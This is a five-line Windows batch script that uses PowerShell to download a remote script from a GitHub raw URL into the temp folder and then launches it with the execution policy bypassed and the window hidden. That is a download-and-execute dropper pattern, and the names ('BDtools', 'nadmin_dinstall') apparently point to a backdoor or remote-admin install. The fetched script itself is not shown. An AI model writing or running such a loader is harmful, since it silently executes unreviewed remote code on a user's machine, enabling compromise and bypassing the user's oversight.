@echo off
powershell.exe /c Invoke-WebRequest -Uri "https://raw.githubusercontent.com/blousekool/BDtools/main/bd/nadmin_dinstall.ps1" -OutFile $env:temp/nadmin_dinstall.ps1
timeout 5
powershell.exe /c Start-Process powershell.exe -ArgumentList '-ExecutionPolicy Bypass -File "%Temp%\nadmin_dinstall.ps1"' -WindowStyle Hidden
exit
